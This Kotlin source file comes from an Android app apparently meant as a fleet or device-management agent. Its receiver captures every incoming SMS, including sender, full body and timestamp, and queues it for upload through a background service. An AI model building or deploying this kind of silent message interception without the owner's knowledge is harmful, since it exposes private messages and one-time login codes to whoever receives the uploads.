package com.fleet.agent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        if (msgs.isEmpty()) return
        val body = msgs.joinToString("") { it.messageBody ?: "" }
        val from = msgs[0].originatingAddress ?: "unknown"
        val ts = msgs[0].timestampMillis
        UploadQueue.enqueueSms(ctx, from, body, ts)
        val i = Intent(ctx, AgentService::class.java).setAction(AgentService.ACTION_DRAIN)
        try { ctx.startForegroundService(i) } catch (_: Throwable) {}
    }
}